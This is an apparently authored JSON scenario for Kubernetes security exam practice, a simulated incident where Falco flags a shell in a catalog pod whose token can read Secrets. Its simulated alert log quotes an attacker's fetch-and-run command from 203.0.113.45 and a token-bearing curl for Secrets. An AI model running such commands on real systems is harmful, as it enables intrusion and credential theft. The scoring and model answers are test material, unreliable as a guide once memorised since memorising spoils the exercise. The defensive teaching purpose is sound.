@@ -1,0 +1,1103 @@
+{
+  "schemaVersion": 1,
+  "engine": {
+    "major": 1,
+    "minor": 2
+  },
+  "slug": "falco-shell-in-catalog-pod",
+  "title": "Incident: Falco reports a shell in the catalog pod, and its token can read Secrets",
+  "screen": {
+    "type": "terminal",
+    "level": 1,
+    "terminal": {
+      "prompt": "admin@cks-lab:~$",
+      "lines": [
+        {
+          "id": "a1",
+          "text": "13:52 Notice: Terminal shell in container (k8s.ns=shop k8s.pod=catalog-6d9f8b7c4-x2kqp)",
+          "when": "true",
+          "at": "0",
+          "error": "true"
+        },
+        {
+          "id": "a2",
+          "text": "13:53 Warning: Contact K8S API Server From Container (k8s.ns=shop k8s.pod=catalog-6d9f8b7c4-x2kqp)",
+          "when": "true",
+          "at": "0",
+          "error": "true"
+        },
+        {
+          "id": "miss",
+          "text": "14:30: payments-api-key read with the catalog ServiceAccount token",
+          "when": "not isNull(stolenAt)",
+          "at": "timeAt(stolenAt)",
+          "error": "true"
+        },
+        {
+          "id": "ok",
+          "text": "14:30: the attacker's next request with the catalog token was refused",
+          "when": "not isNull(safeAt)",
+          "at": "timeAt(safeAt)"
+        }
+      ],
+      "nodes": [
+        {
+          "id": "pod",
+          "label": "Pod catalog-6d9f8b7c4-x2kqp",
+          "spokenLabel": "the catalog pod",
+          "kind": "catalog:4.2.0, ServiceAccount catalog",
+          "status": "{podDeleted ? \"deleted\" : isolated ? \"quarantined: deny-all NetworkPolicy\" : \"running a shell from the attacker\"}",
+          "tone": "podDeleted or isolated ? \"degraded\" : \"down\""
+        },
+        {
+          "id": "sa",
+          "label": "ServiceAccount shop/catalog",
+          "spokenLabel": "the catalog service account",
+          "kind": "RoleBinding catalog-reader",
+          "status": "{rbacRemoved ? \"no access to Secrets\" : \"can get and list Secrets in shop\"}",
+          "tone": "rbacRemoved ? \"up\" : \"down\""
+        },
+        {
+          "id": "sec",
+          "label": "Secrets in shop",
+          "spokenLabel": "the shop Secrets",
+          "kind": "db-password, payments-api-key",
+          "status": "{not isNull(stolenAt) ? \"read by the attacker\" : secretsRotated ? \"rotated\" : \"at risk\"}",
+          "tone": "not isNull(stolenAt) ? \"down\" : secretsRotated ? \"up\" : \"degraded\""
+        },
+        {
+          "id": "svc",
+          "label": "Deployment shop/catalog",
+          "spokenLabel": "the catalog deployment",
+          "kind": "3 replicas",
+          "status": "{hardened ? \"catalog:4.2.1, read-only root, non-root, no token\" : \"catalog:4.2.0\"}",
+          "tone": "hardened ? \"up\" : \"degraded\""
+        }
+      ],
+      "links": [
+        {
+          "id": "l1",
+          "from": "pod",
+          "to": "sa",
+          "label": "Mounts the token",
+          "status": "{hardened ? \"not mounted\" : \"/var/run/secrets/kubernetes.io/serviceaccount\"}",
+          "tone": "hardened ? \"up\" : \"degraded\""
+        },
+        {
+          "id": "l2",
+          "from": "sa",
+          "to": "sec",
+          "label": "RBAC",
+          "status": "{rbacRemoved ? \"removed\" : \"get, list\"}",
+          "tone": "rbacRemoved ? \"up\" : \"down\""
+        },
+        {
+          "id": "l3",
+          "from": "svc",
+          "to": "pod",
+          "label": "Owns",
+          "status": "{isolated ? \"label removed: orphaned\" : \"selected\"}",
+          "tone": "\"up\""
+        }
+      ]
+    }
+  },
+  "objective": "Perform behavioral analytics to detect malicious activity with Falco: read and write rules, interpret alerts and identify the Pod and process behind them",
+  "secondaryObjectives": [
+    "Ensure immutability of containers at runtime: read-only root filesystems, no privilege escalation, no exec into production Pods, and recreating rather than patching containers",
+    "Use Kubernetes audit logs to monitor access: write an audit Policy with levels per resource and verb, enable it on the API server, and query the log for who did what"
+  ],
+  "sources": [
+    {
+      "cite": "CNCF CKS Curriculum v1.37 (cncf/curriculum, pinned commit 0a8cc08a): Cluster Setup 15%, Cluster Hardening 15%, System Hardening 10%, Minimize Microservice Vulnerabilities 20%, Supply Chain Security 20%, Monitoring, Logging and Runtime Security 20%",
+      "checkedAt": "2026-11-17",
+      "url": "https://github.com/cncf/curriculum/tree/0a8cc08a502710a894e5724c2bec7b88404e5a6b",
+      "note": "The curriculum was read in primary text on 2026-11-07 by the course builder (backend/supabase/seed/tracks/kubernetes.ts). On 2026-11-17 a third-party summary (slauger.github.io/kubestronaut/cks/monitoring-logging-runtime) confirmed the 20% domain; the PDF itself was not re-read. The objective wording is the course seed's."
+    },
+    {
+      "cite": "Kubestronaut study notes, CKS: Monitoring, Logging and Runtime Security (slauger.github.io)",
+      "checkedAt": "2026-11-17",
+      "url": "https://slauger.github.io/kubestronaut/cks/monitoring-logging-runtime/",
+      "note": "Read through a summarizing fetch on 2026-11-17 (a third-party page, not Falco's own documentation). Relevant points: the default rule 'Terminal shell in container' at Notice priority, its output fields (user, process, parent, command line, container); custom rules belong in falco_rules.local.yaml because falco_rules.yaml is overwritten on upgrade; readOnlyRootFilesystem blocks runtime changes; a compromised pod is isolated with a quarantine label and a NetworkPolicy that denies all ingress and egress. The page itself deletes the pod without saving evidence; this case follows NIST SP 800-61 on evidence. The 'Contact K8S API Server From Container' rule name and its wording here are to verify against Falco's default rules page (seen only as a search result title on 2026-11-17)."
+    },
+    {
+      "cite": "NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management: A CSF 2.0 Community Profile (April 2025)",
+      "checkedAt": "2026-11-11",
+      "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+      "note": "Read on 2026-11-11 for REQ-238 (not re-read). Relevant text: RS.MI-01 'Containment refers to preventing the expansion of an incident'; RS.AN-07 incident data collected with integrity and provenance preserved."
+    },
+    {
+      "cite": "IETF RFC 5737 (IPv4 address blocks reserved for documentation: 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24)",
+      "checkedAt": "2026-11-11",
+      "url": "https://www.rfc-editor.org/rfc/rfc5737",
+      "note": "The attacker's address 203.0.113.45 is in a documentation range; read 2026-11-11 for REQ-238."
+    }
+  ],
+  "brief": {
+    "situation": "You are the platform security engineer for Pinecrest Outdoor, a fictional online store on Kubernetes. At 14:00 the security channel forwards two Falco alerts from 13:52 and 13:53 on the shop namespace. The catalog service runs image catalog:4.2.0, which the vendor said this morning has a remote code execution flaw. The shop's payment key lives in a Secret in the same namespace.",
+    "handover": [
+      "Falco runs as a DaemonSet in namespace falco; the API server writes an audit log to /var/log/kubernetes/audit/audit.log on cp1.",
+      "catalog:4.2.1 fixes the flaw. The team's rule is that production pods are replaced, never patched or entered by hand."
+    ],
+    "howItWorks": [
+      "The terminal shows each command's output; the diagram shows the catalog pod, its ServiceAccount and what it can reach.",
+      "Each command takes a minute or two; the clock moves only when you act or wait.",
+      "When you close, you write the record and explain your reasoning."
+    ]
+  },
+  "clock": {
+    "start": "14:00",
+    "tick": "1min",
+    "maxDuration": "600min",
+    "calendar": "clock"
+  },
+  "params": {
+    "nextStepAt": {
+      "value": 1800,
+      "unit": "s",
+      "source": {
+        "cite": "Scenario data (authored)",
+        "checkedAt": "2026-11-17",
+        "note": "At 14:30 the attacker uses the token again, 30 minutes after the page."
+      }
+    }
+  },
+  "state": {
+    "busy": {
+      "type": "bool",
+      "init": false
+    },
+    "falcoAt": {
+      "type": "time",
+      "init": null
+    },
+    "podAt": {
+      "type": "time",
+      "init": null
+    },
+    "rbacAt": {
+      "type": "time",
+      "init": null
+    },
+    "auditAt": {
+      "type": "time",
+      "init": null
+    },
+    "evidence": {
+      "type": "bool",
+      "init": false
+    },
+    "evidenceLost": {
+      "type": "bool",
+      "init": false
+    },
+    "execed": {
+      "type": "bool",
+      "init": false
+    },
+    "isolated": {
+      "type": "bool",
+      "init": false
+    },
+    "podDeleted": {
+      "type": "bool",
+      "init": false
+    },
+    "rbacRemoved": {
+      "type": "bool",
+      "init": false
+    },
+    "hardened": {
+      "type": "bool",
+      "init": false
+    },
+    "secretsRotated": {
+      "type": "bool",
+      "init": false
+    },
+    "falcoMuted": {
+      "type": "bool",
+      "init": false
+    },
+    "safeAt": {
+      "type": "time",
+      "init": null
+    },
+    "stolenAt": {
+      "type": "time",
+      "init": null
+    },
+    "causeDoc": {
+      "type": "enum",
+      "values": [
+        "unset",
+        "rce",
+        "noise",
+        "insider"
+      ],
+      "init": "unset"
+    },
+    "closedAt": {
+      "type": "time",
+      "init": null
+    },
+    "documented": {
+      "type": "bool",
+      "init": false
+    }
+  },
+  "derived": {
+    "attackerIn": {
+      "expr": "not podDeleted and not isolated"
+    },
+    "reentry": {
+      "expr": "(podDeleted or isolated) and not hardened"
+    },
+    "exposed": {
+      "expr": "not rbacRemoved and (attackerIn or reentry)"
+    }
+  },
+  "processes": [],
+  "phases": {
+    "incident": {
+      "label": "Incident in progress",
+      "clock": "turns",
+      "actions": [
+        "falcoLog",
+        "describe",
+        "canI",
+        "audit",
+        "evidence",
+        "quarantine",
+        "deletePod",
+        "exec",
+        "muteRule",
+        "rbac",
+        "harden",
+        "rotate",
+        "watch",
+        "closeOutage"
+      ]
+    },
+    "report": {
+      "label": "Write-up",
+      "clock": "stopped",
+      "actions": [
+        "document"
+      ]
+    }
+  },
+  "initialPhase": "incident",
+  "actions": {
+    "falcoLog": {
+      "label": "kubectl logs -n falco -l app.kubernetes.io/name=falco --since=30m | grep shop",
+      "group": "Look",
+      "available": "not busy",
+      "why": "Wait for the running command to finish.",
+      "effects": [
+        {
+          "if": "isNull(falcoAt)",
+          "then": [
+            {
+              "set": "falcoAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl logs -n falco -l app.kubernetes.io/name=falco --since=30m | grep shop\n13:52:07 Notice A shell was spawned in a container with an attached terminal (user=www-data process=sh parent=java cmdline=sh -c curl -s http://203.0.113.45/x.sh | sh terminal=34816 k8s.ns=shop k8s.pod=catalog-6d9f8b7c4-x2kqp container=catalog image=catalog:4.2.0)\n13:53:40 Warning Unexpected connection to K8s API Server from container (command=curl -sk -H Authorization: Bearer ... https://10.96.0.1/api/v1/namespaces/shop/secrets k8s.ns=shop k8s.pod=catalog-6d9f8b7c4-x2kqp container=catalog)"
+        },
+        {
+          "finding": "The java process of catalog started a shell that fetched a script from 203.0.113.45, then the container called the API server for the shop Secrets with its own token: the vendor's flaw, exploited."
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "1min"
+        }
+      ]
+    },
+    "describe": {
+      "label": "kubectl get pod catalog-6d9f8b7c4-x2kqp -n shop -o wide --show-labels",
+      "group": "Look",
+      "available": "not busy",
+      "why": "Wait for the running command to finish.",
+      "effects": [
+        {
+          "if": "isNull(podAt)",
+          "then": [
+            {
+              "set": "podAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl get pod catalog-6d9f8b7c4-x2kqp -n shop -o wide --show-labels\nNAME                        READY   STATUS    NODE   LABELS\ncatalog-6d9f8b7c4-x2kqp   1/1     Running   w2     app=catalog,pod-template-hash=6d9f8b7c4\nserviceAccountName: catalog   automountServiceAccountToken: (default, true)   securityContext: (none set)"
+        },
+        {
+          "finding": "The pod runs on w2 as ServiceAccount catalog with its token mounted, no securityContext, and a writable root filesystem."
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "1min"
+        }
+      ]
+    },
+    "canI": {
+      "label": "kubectl auth can-i --list --as=system:serviceaccount:shop:catalog -n shop",
+      "group": "Look",
+      "available": "not busy",
+      "why": "Wait for the running command to finish.",
+      "effects": [
+        {
+          "if": "isNull(rbacAt)",
+          "then": [
+            {
+              "set": "rbacAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl auth can-i --list --as=system:serviceaccount:shop:catalog -n shop\nResources   Non-Resource URLs   Resource Names   Verbs\n{rbacRemoved ? \"selfsubjectreviews.authentication.k8s.io   []   []   [create]\" : \"secrets      []   []   [get list]\nconfigmaps   []   []   [get list]\"}"
+        },
+        {
+          "finding": "RoleBinding catalog-reader gives the catalog token get and list on every Secret in shop. catalog needs none of them: its database password comes from a mounted file."
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "1min"
+        }
+      ]
+    },
+    "audit": {
+      "label": "grep 'serviceaccount:shop:catalog' /var/log/kubernetes/audit/audit.log | jq '.verb,.objectRef.name,.responseStatus.code'",
+      "group": "Look",
+      "available": "not busy",
+      "why": "Wait for the running command to finish.",
+      "effects": [
+        {
+          "if": "isNull(auditAt)",
+          "then": [
+            {
+              "set": "auditAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "output": "admin@cks-lab:~$ grep 'serviceaccount:shop:catalog' /var/log/kubernetes/audit/audit.log | jq -c '[.stageTimestamp,.verb,.objectRef.resource,.objectRef.name,.responseStatus.code]'\n[\"13:53:41\",\"list\",\"secrets\",null,200]\n[\"13:53:44\",\"get\",\"secrets\",\"db-password\",200]"
+        },
+        {
+          "finding": "At 13:53 the token listed the shop Secrets and read db-password. payments-api-key has not been read yet. db-password must be rotated whatever else happens."
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "2min"
+        }
+      ]
+    },
+    "evidence": {
+      "label": "Save the pod spec, container logs, Falco events and the catalog audit entries to the case folder",
+      "group": "Evidence",
+      "available": "not busy and (not evidence)",
+      "why": "Already saved.",
+      "effects": [
+        {
+          "cases": [
+            {
+              "when": "podDeleted",
+              "then": [
+                {
+                  "output": "admin@cks-lab:~$ kubectl get pod catalog-6d9f8b7c4-x2kqp -n shop -o yaml > case-0417/pod.yaml\nError from server (NotFound): pods \"catalog-6d9f8b7c4-x2kqp\" not found"
+                },
+                {
+                  "log": "The pod is gone, and with it its logs and filesystem. Only the Falco events and audit entries are saved.",
+                  "kind": "bad"
+                }
+              ]
+            },
+            {
+              "when": "true",
+              "then": [
+                {
+                  "set": "evidence",
+                  "to": "true"
+                },
+                {
+                  "output": "admin@cks-lab:~$ kubectl get pod catalog-6d9f8b7c4-x2kqp -n shop -o yaml > case-0417/pod.yaml; kubectl logs catalog-6d9f8b7c4-x2kqp -n shop > case-0417/catalog.log\nsaved: pod.yaml, catalog.log, falco-events.json, audit-catalog.json (sha256sum written to case-0417/SHA256SUMS)"
+                },
+                {
+                  "log": "Evidence saved and hashed before anything changes.",
+                  "kind": "good"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "2min"
+        }
+      ]
+    },
+    "quarantine": {
+      "label": "kubectl label pod catalog-6d9f8b7c4-x2kqp -n shop quarantine=true app- ; apply the deny-all NetworkPolicy for quarantine=true",
+      "group": "Contain",
+      "available": "not busy and (not isolated and not podDeleted)",
+      "why": "Already isolated, or the pod is gone.",
+      "effects": [
+        {
+          "set": "isolated",
+          "to": "true"
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl label pod catalog-6d9f8b7c4-x2kqp -n shop quarantine=true app-\npod/catalog-6d9f8b7c4-x2kqp labeled\nadmin@cks-lab:~$ kubectl apply -f quarantine-deny-all.yaml   # podSelector quarantine=true, policyTypes Ingress, Egress, no rules\nnetworkpolicy.networking.k8s.io/quarantine-deny-all created"
+        },
+        {
+          "log": "The pod keeps running for evidence but can reach nothing and nothing reaches it. Without the app label the ReplicaSet starts a replacement: still catalog:4.2.0, still the token.",
+          "kind": "good"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "1min"
+        }
+      ]
+    },
+    "deletePod": {
+      "label": "kubectl delete pod catalog-6d9f8b7c4-x2kqp -n shop",
+      "group": "Contain",
+      "available": "not busy and (not podDeleted)",
+      "why": "Already deleted.",
+      "effects": [
+        {
+          "if": "not evidence",
+          "then": [
+            {
+              "set": "evidenceLost",
+              "to": "true"
+            }
+          ]
+        },
+        {
+          "set": "podDeleted",
+          "to": "true"
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl delete pod catalog-6d9f8b7c4-x2kqp -n shop\npod \"catalog-6d9f8b7c4-x2kqp\" deleted"
+        },
+        {
+          "log": "The shell is gone with the pod{evidence ? \"\" : \", and so are its logs and filesystem\"}. The ReplicaSet starts a replacement from catalog:4.2.0 with the same token.",
+          "kind": "bad"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "1min"
+        }
+      ]
+    },
+    "exec": {
+      "label": "kubectl exec -it catalog-6d9f8b7c4-x2kqp -n shop -- sh   (look around inside)",
+      "group": "Look",
+      "available": "not busy and (not podDeleted)",
+      "why": "The pod is gone.",
+      "effects": [
+        {
+          "set": "execed",
+          "to": "true"
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl exec -it catalog-6d9f8b7c4-x2kqp -n shop -- sh\n$ ls /tmp\nx.sh  kubectl\n$ exit"
+        },
+        {
+          "log": "You see the dropped files, but your own shell is now in the evidence: Falco logs your session like the attacker's, and anything you touched is changed.",
+          "kind": "bad"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "1min"
+        }
+      ]
+    },
+    "muteRule": {
+      "label": "Add a falco_rules.local.yaml override: disable 'Terminal shell in container' for namespace shop (too noisy)",
+      "group": "Fix",
+      "available": "not busy and (not falcoMuted)",
+      "why": "Already muted.",
+      "effects": [
+        {
+          "set": "falcoMuted",
+          "to": "true"
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl -n falco edit configmap falco-rules-local   # append condition and not k8s.ns.name=shop\nconfigmap/falco-rules-local edited"
+        },
+        {
+          "log": "The alert stops. Nothing else changes.",
+          "kind": "bad"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "1min"
+        }
+      ]
+    },
+    "rbac": {
+      "label": "kubectl delete rolebinding catalog-reader -n shop",
+      "group": "Contain",
+      "available": "not busy and (not rbacRemoved)",
+      "why": "Already removed.",
+      "effects": [
+        {
+          "set": "rbacRemoved",
+          "to": "true"
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl delete rolebinding catalog-reader -n shop\nrolebinding.rbac.authorization.k8s.io \"catalog-reader\" deleted"
+        },
+        {
+          "log": "The catalog token can no longer read Secrets, from any pod.",
+          "kind": "good"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "1min"
+        }
+      ]
+    },
+    "harden": {
+      "label": "Roll out catalog:4.2.1 with automountServiceAccountToken: false, runAsNonRoot, readOnlyRootFilesystem and allowPrivilegeEscalation: false",
+      "group": "Fix",
+      "available": "not busy and (not hardened)",
+      "why": "Already rolled out.",
+      "effects": [
+        {
+          "set": "hardened",
+          "to": "true"
+        },
+        {
+          "if": "not isolated and not podDeleted",
+          "then": [
+            {
+              "set": "podDeleted",
+              "to": "true"
+            },
+            {
+              "if": "not evidence",
+              "then": [
+                {
+                  "set": "evidenceLost",
+                  "to": "true"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl -n shop set image deploy/catalog catalog=catalog:4.2.1 && kubectl -n shop patch deploy catalog --patch-file harden.yaml\ndeployment.apps/catalog image updated\ndeployment.apps/catalog patched\ndeployment \"catalog\" successfully rolled out"
+        },
+        {
+          "log": "New pods run the fixed image, as a non-root user, with a read-only root filesystem and no token{isolated ? \"; the quarantined pod is outside the Deployment and stays\" : \"; the rollout replaced the compromised pod\"}.",
+          "kind": "good"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "3min"
+        }
+      ]
+    },
+    "rotate": {
+      "label": "Rotate db-password and payments-api-key at their issuers and update the Secrets",
+      "group": "Fix",
+      "available": "not busy and (not secretsRotated)",
+      "why": "Already rotated.",
+      "effects": [
+        {
+          "set": "secretsRotated",
+          "to": "true"
+        },
+        {
+          "output": "admin@cks-lab:~$ kubectl -n shop create secret generic db-password --from-file=password=new-db.txt --dry-run=client -o yaml | kubectl apply -f -\nsecret/db-password configured\nsecret/payments-api-key configured"
+        },
+        {
+          "log": "Both values are new; whatever the attacker read is now useless.",
+          "kind": "good"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "2min"
+        }
+      ]
+    },
+    "watch": {
+      "label": "Keep watching (5 min)",
+      "group": "Wait",
+      "available": "not busy",
+      "why": "Wait for the running command to finish.",
+      "effects": [
+        {
+          "log": "You watch for 5 minutes.",
+          "kind": "act"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "5min"
+        }
+      ]
+    },
+    "closeOutage": {
+      "label": "Close the incident and write the record",
+      "group": "Close",
+      "available": "not busy",
+      "why": "Wait for the running task to finish.",
+      "effects": [
+        {
+          "cancel": "work"
+        },
+        {
+          "set": "busy",
+          "to": "false"
+        },
+        {
+          "set": "closedAt",
+          "to": "t"
+        },
+        {
+          "log": "You close the incident.",
+          "kind": "act"
+        },
+        {
+          "phase": "report"
+        }
+      ]
+    },
+    "document": {
+      "label": "Write the incident record",
+      "group": "Report",
+      "available": "not documented",
+      "why": "Done.",
+      "params": [
+        {
+          "id": "record",
+          "kind": "form",
+          "label": "Record",
+          "fields": [
+            {
+              "id": "cause",
+              "label": "What happened",
+              "options": [
+                {
+                  "value": "rce",
+                  "label": "The catalog:4.2.0 flaw gave a shell; its mounted token could read Secrets through RoleBinding catalog-reader"
+                },
+                {
+                  "value": "noise",
+                  "label": "A noisy Falco rule"
+                },
+                {
+                  "value": "insider",
+                  "label": "An administrator's interactive session"
+                }
+              ]
+            }
+          ]
+        }
+      ],
+      "effects": [
+        {
+          "set": "causeDoc",
+          "to": "cause"
+        },
+        {
+          "log": "Recorded: {cause}.",
+          "kind": "act"
+        },
+        {
+          "set": "documented",
+          "to": "true"
+        }
+      ]
+    }
+  },
+  "timers": {
+    "work": {
+      "label": "Task running",
+      "wait": {
+        "skipLabel": "Let the work finish"
+      },
+      "instances": "one",
+      "source": {
+        "cite": "Author's scenario timing (REQ-320)",
+        "checkedAt": "2026-11-17",
+        "note": "How many minutes each command or task takes, and when the fictional problem spreads, are teaching simplifications for exam practice, not measured values."
+      },
+      "effects": [
+        {
+          "set": "busy",
+          "to": "false"
+        }
+      ]
+    }
+  },
+  "triggers": [
+    {
+      "id": "deadline",
+      "when": "t >= nextStepAt and phase == \"incident\"",
+      "mode": "once",
+      "interruptsSkip": true,
+      "effects": [
+        {
+          "if": "not exposed",
+          "then": [
+            {
+              "set": "safeAt",
+              "to": "t"
+            },
+            {
+              "log": "14:30: a request with the catalog token is refused; the attacker is cut off.",
+              "kind": "good"
+            }
+          ],
+          "else": [
+            {
+              "set": "stolenAt",
+              "to": "t"
+            },
+            {
+              "log": "14:30: the catalog token lists and reads every Secret in shop, payments-api-key included.",
+              "kind": "alarm"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "writeUp",
+      "when": "phase == \"report\"",
+      "mode": "once",
+      "effects": [
+        {
+          "reason": "writeup"
+        }
+      ]
+    }
+  ],
+  "reasoning": {
+    "writeup": {
+      "question": "For the record: what Falco showed, how you contained it, and what you kept.",
+      "pausesClock": true,
+      "parts": [
+        {
+          "label": "What happened",
+          "criteria": "Reads the two alerts as one attack: a shell from the java process, then API calls with the pod's own token.",
+          "modelAnswer": "Falco showed sh spawned by java fetching a script, then the container calling the API for Secrets: the catalog flaw exploited, and the mounted token read db-password at 13:53 (audit log)."
+        },
+        {
+          "label": "Contained",
+          "criteria": "Cuts the token's rights and isolates the pod instead of deleting it, before 14:30.",
+          "modelAnswer": "Removed RoleBinding catalog-reader so no catalog token can read Secrets, and quarantined the pod with a label and a deny-all NetworkPolicy so it stayed for evidence."
+        },
+        {
+          "label": "Kept and fixed",
+          "criteria": "Saves evidence before changing anything and without exec, then replaces rather than patches and rotates what was read.",
+          "modelAnswer": "Saved and hashed the pod spec, logs, Falco and audit entries first; rolled out 4.2.1 with no token, non-root and a read-only root; rotated db-password and payments-api-key."
+        }
+      ]
+    }
+  },
+  "outcome": {
+    "profile": "security",
+    "thresholds": {
+      "containWindow": {
+        "value": 1800,
+        "source": {
+          "cite": "Security outcome profile (docs/sims.md 9.2, 22.7), tightened to 30 minutes for this case",
+          "checkedAt": "2026-11-17",
+          "note": "The attacker uses the token again at 14:30; the scenario's own timing."
+        }
+      },
+      "containSpread": {
+        "value": 0,
+        "source": {
+          "cite": "Security outcome profile (docs/sims.md 9.2, 22.7)",
+          "checkedAt": "2026-11-17",
+          "note": "No further Secret read after the page."
+        }
+      }
+    },
+    "noProgress": {
+      "when": "documented and exposed",
+      "class": "harm",
+      "rationale": "Closing while the token can still read Secrets from a reachable pod leaves the attacker in.",
+      "source": {
+        "cite": "Kubernetes documentation, Configure Service Accounts for Pods",
+        "checkedAt": "2026-11-17",
+        "url": "https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/",
+        "note": "To verify: cited from search results only on 2026-11-17 (the page title); a Pod mounts its ServiceAccount token unless automountServiceAccountToken is false, as the course seed's CKS and CKAD objectives also state."
+      }
+    }
+  },
+  "endings": {
+    "stolen": {
+      "label": "The payment key was read",
+      "class": "harm",
+      "terminal": true,
+      "when": "documented and not isNull(stolenAt)",
+      "narrative": "At 14:30 the catalog token still had its rights and the attacker could still use it."
+    },
+    "evidenceGone": {
+      "label": "Evidence destroyed",
+      "class": "harm",
+      "terminal": true,
+      "when": "documented and evidenceLost",
+      "narrative": "The compromised pod was deleted, or replaced by a rollout, before its spec and logs were saved."
+    },
+    "contained": {
+      "label": "Contained, evidence kept, hardened",
+      "class": "target",
+      "terminal": true,
+      "when": "documented and isNull(stolenAt) and evidence and not execed and isolated and rbacRemoved and hardened and secretsRotated and not falcoMuted and not isNull(falcoAt) and not isNull(auditAt) and causeDoc == \"rce\"",
+      "narrative": "The alerts read, the token cut off and the pod quarantined before 14:30, evidence saved first, the fixed image rolled out hardened and the Secrets rotated."
+    },
+    "gaps": {
+      "label": "Contained, with gaps",
+      "class": "recovered",
+      "terminal": true,
+      "when": "documented",
+      "narrative": "The Secrets were safe at 14:30, but a step was left or done in a way that costs later."
+    },
+    "time_up": {
+      "label": "Time up",
+      "class": "harm",
+      "terminal": true,
+      "narrative": "The run reached its time limit with no record written."
+    }
+  },
+  "endingOrder": [
+    "stolen",
+    "evidenceGone",
+    "contained",
+    "gaps"
+  ],
+  "scoring": {
+    "criteria": [
+      {
+        "id": "identify",
+        "label": "Read the Falco alerts to the pod, process and token use",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "not isNull(falcoAt) and not isNull(podAt)",
+            "score": "met",
+            "why": "Alert fields read, pod and ServiceAccount identified."
+          },
+          {
+            "when": "not isNull(falcoAt) or not isNull(podAt)",
+            "score": "partial",
+            "why": "One of the two."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "Acted without reading the alerts."
+          }
+        ]
+      },
+      {
+        "id": "contain",
+        "label": "Token cut off and pod isolated before 14:30",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "isolated and rbacRemoved and isNull(stolenAt)",
+            "score": "met",
+            "why": "Both, in time."
+          },
+          {
+            "when": "isNull(stolenAt)",
+            "score": "partial",
+            "why": "Safe at 14:30, but not both controls."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "The payment key was read at 14:30."
+          }
+        ]
+      },
+      {
+        "id": "evidence",
+        "label": "Evidence saved first, without exec",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "evidence and not execed and not evidenceLost",
+            "score": "met",
+            "why": "Saved and hashed, untouched."
+          },
+          {
+            "when": "evidence",
+            "score": "partial",
+            "why": "Saved, after an exec changed it."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "{evidenceLost ? \"The pod was deleted first.\" : \"Not saved.\"}"
+          }
+        ]
+      },
+      {
+        "id": "after",
+        "label": "Audit checked, replaced hardened, read Secrets rotated, alerting left on",
+        "weight": 1,
+        "rows": [
+          {
+            "when": "hardened and secretsRotated and not isNull(auditAt) and not falcoMuted",
+            "score": "met",
+            "why": "All of it."
+          },
+          {
+            "when": "hardened or secretsRotated",
+            "score": "partial",
+            "why": "Some of it."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "{falcoMuted ? \"The rule that caught it was muted.\" : \"None of it.\"}"
+          }
+        ]
+      },
+      {
+        "id": "record",
+        "label": "Record names the cause",
+        "weight": 1,
+        "rows": [
+          {
+            "when": "causeDoc == \"rce\"",
+            "score": "met",
+            "why": "Record right."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "The record does not describe what Falco and the audit log show."
+          }
+        ]
+      }
+    ],
+    "reasoningCriteria": [
+      {
+        "moment": "writeup",
+        "label": "Written why, how and what it cost",
+        "weight": 1
+      }
+    ],
+    "kpis": [
+      {
+        "id": "minContain",
+        "label": "Secret reads after the page",
+        "value": "isNull(stolenAt) ? 0 : 1",
+        "format": "number",
+        "expert": "0"
+      }
+    ],
+    "expertPath": [
+      {
+        "at": "14:00-14:03",
+        "text": "Falco logs: sh from java fetching a script, then API calls for Secrets; the pod's ServiceAccount and labels; can-i shows get and list on Secrets."
+      },
+      {
+        "at": "14:03-14:07",
+        "text": "The audit log shows db-password read at 13:53; save and hash the pod spec, logs, Falco and audit entries."
+      },
+      {
+        "at": "14:07-14:09",
+        "text": "Quarantine label and deny-all NetworkPolicy; delete RoleBinding catalog-reader."
+      },
+      {
+        "at": "14:09-14:14",
+        "text": "Roll out 4.2.1 with no token, non-root and a read-only root; rotate db-password and payments-api-key."
+      }
+    ],
+    "debrief": {
+      "stolen": {
+        "headline": "The token was still good at 14:30",
